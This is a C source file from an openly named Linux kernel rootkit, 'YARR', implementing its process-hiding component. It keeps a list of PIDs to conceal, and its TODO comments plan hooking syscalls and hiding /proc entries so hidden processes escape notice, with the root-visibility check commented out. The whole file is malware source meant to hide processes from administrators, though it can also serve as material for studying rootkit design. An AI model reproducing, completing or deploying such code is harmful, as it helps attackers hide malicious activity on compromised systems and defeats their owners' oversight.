/*
 *  YARR - Yet Another Repetitive Rootkit
 *  Copyright (C) 2011 Ole 
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 1, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

// TODO: Not done yet. How should be done? Every syscall that implies asking
// something about a tasks (i.e. each syscall with a PID as parameter, but not
// just those. What about syscalls that acts on every tasks?) should be
// patched/hooked/hijacked so they check the PIDs inside the list and if the
// PID requested is inside the list then return an error (ESRCH, check man
// errno).

// TODO: There is another interesting problem we need to handle, if a PID is
// hide and then that program ends its execution we need to take care of that
// and remove it from the list. If we don't there would be a nasty problem when
// the PIDs wraps around.

// TODO: It would be much nicer if hiding would already implied hiding also its
// /proc/<pid> interface. I tried a simple hidefile(/proc/<pid>) inside
// hideProc() but then I realized that is not that easy because hideFile needs
// a const char __USER * as filename (note __user), but the one that we build
// and pass from here is not in user space but in kernel space, that provoke
// hideFile() to fail. My solution right now is creating a user space program
// that wraps all this logic and do both things at once. Maybe not as elegant
// as doing it from here, but effective and quick.

#include <linux/types.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/pid.h>

#include "hideproc.h"
#include "funcs.h"
#include "debug.h"

struct hide_pid {
	struct list_head list;
	pid_t pid;
} hide_pids_list;

/***
 * For debugging purposes. Prints the list of PIDs.
 */
void print_hide_tasks(void) {
	struct list_head *pos;
	struct hide_pid *curr;

	debug("hidden_tasks: [");
	list_for_each(pos, &hide_pids_list.list) {
		curr = list_entry(pos, struct hide_pid, list);
		debug("%d, ", curr->pid);
	}

	debug("]\n");
	return;
}

void init_hideproc() {
	INIT_LIST_HEAD(&hide_pids_list.list);
}

void exit_hideproc() {
	struct list_head *pos, *n;
	struct hide_pid *curr;
	
	// Free all the memory taken for the active hidden PIDs.
	list_for_each_safe(pos, n, &hide_pids_list.list) {
		curr = list_entry(pos, struct hide_pid, list);
		list_del(pos);
		kfree(curr);
	}
}

int hideProc(pid_t pid) {
	int res = -1;
	struct hide_pid *tmp;

	// Allocate a new struct hide_pid structure to maintain this new PID, of
	// just if it wasn't previously hide.
	if (!isProcHidden(pid)) {
		tmp = (struct hide_pid *)kmalloc(sizeof(struct hide_pid), GFP_KERNEL);
		tmp->pid = pid;
		list_add(&(tmp->list), &(hide_pids_list.list));
		res = 0;
	}

	print_hide_tasks();
	return res;
}

int stopHideProc(pid_t pid) {
	int res = -1;
	struct list_head *pos, *n;
	struct hide_pid *curr;
	
	// Search the PID passed inside the list, if we find it then remove it from
	// the list and free that chuck of memory allocated when the PID was hid.
	list_for_each_safe(pos, n, &hide_pids_list.list) {
		curr = list_entry(pos, struct hide_pid, list);
		if (curr->pid == pid) {
			list_del(pos);
			kfree(curr);
			res = 0;
		}
	}

	print_hide_tasks();
	return res;
}

int isProcHidden(pid_t pid) {
	struct list_head *pos;
	struct hide_pid *curr;
	struct task_struct *tsk;
	int res = 0;

	// Iterate over the list searching the PID passed.
	list_for_each(pos, &hide_pids_list.list) {
		curr = list_entry(pos, struct hide_pid, list);
		if (curr->pid == pid)
			res = 1;
	}

	// TODO: Right now root can find every task, of course this would change
	// in the future.
	// Even a task being hidden is revealed if one of these conditions meet:
	// - The task is looking for itself.
	// - The parent is asking for a hide child.
	// - Root is looking for it (root privileges in fact).
	tsk = get_task_by_pid(pid);
	if (tsk != NULL)
		if (current == tsk || current == tsk->parent /*||
			current->cred->euid == 0*/)
				res = 0;

	return res;
}

